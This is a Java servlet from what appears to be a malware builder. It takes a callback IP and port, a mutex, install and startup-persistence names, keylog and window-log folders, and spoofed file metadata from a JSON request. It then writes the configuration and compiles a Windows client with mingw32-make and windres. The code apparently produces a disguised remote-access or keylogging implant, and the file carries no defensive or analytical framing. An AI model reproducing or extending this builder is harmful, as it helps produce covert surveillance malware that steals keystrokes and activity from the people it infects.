package Utilities.Servlets;

import Packets.Compilation.AssemblySettings;
import Packets.Compilation.CompileSettings;
import Compiler.FileModifier;
import Compiler.ClientExtractor;

import org.json.JSONObject;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.swing.*;
import java.io.BufferedReader;
import java.io.IOException;
import Compiler.CompilerProcess;

public class CompilationServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = req.getReader()) {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append('\n');
            }
        }
        String jsonText = sb.toString();
        System.out.println(jsonText);
        JSONObject jsonObject = new JSONObject(jsonText);
        System.out.println("Received to compile: "+jsonObject);

        // TODO fix folder location of modules
        CompileSettings compileSettings = new CompileSettings(
                jsonObject.getString("ip"),
                jsonObject.getInt("port"),
                jsonObject.getString("tag"),
                jsonObject.getString("mutex"),
                jsonObject.getInt("timing"),
                "WLogs",
                "KLogs",
                jsonObject.getInt("installationPath"),
                jsonObject.getString("folderName"),
                jsonObject.getString("executableName"),
                jsonObject.getString("startupName")
        );

        AssemblySettings assemblySettings = new AssemblySettings(
                jsonObject.getString("fileDescription"),
                jsonObject.getString("versionOfFileAndProduct"),
                jsonObject.getString("originalName"),
                jsonObject.getString("productName"),
                jsonObject.getString("copyright"),
                "" // TODO ICON IMPLEMENTATION
        );
        ClientExtractor clientExtractor = new ClientExtractor();
        clientExtractor.call();

        FileModifier uniqueCompiler = new FileModifier(ClientExtractor.localClientFiles);
        uniqueCompiler.generateConfigurationFile(compileSettings);
        uniqueCompiler.generateAssemblyConfigurationFile(assemblySettings);

        CompilerProcess compilerProcess = new CompilerProcess("mingw32-make -j6", "windres assembly.rc compiled_assembly.opc", ClientExtractor.localClientFiles);
        int result = compilerProcess.call();
        String message = "";
        switch (result){
            case -1 -> message = "Error assembling client, check for windres and try again.";
            case -2 -> message = "Error compiling client, check your compiler and try again.";
            case 0 -> message = "Client compiled successfully!";
        }

        resp.setContentType("application/json");
        resp.getWriter().println("{ \"status\": \""+message+"\" }");
    }
}

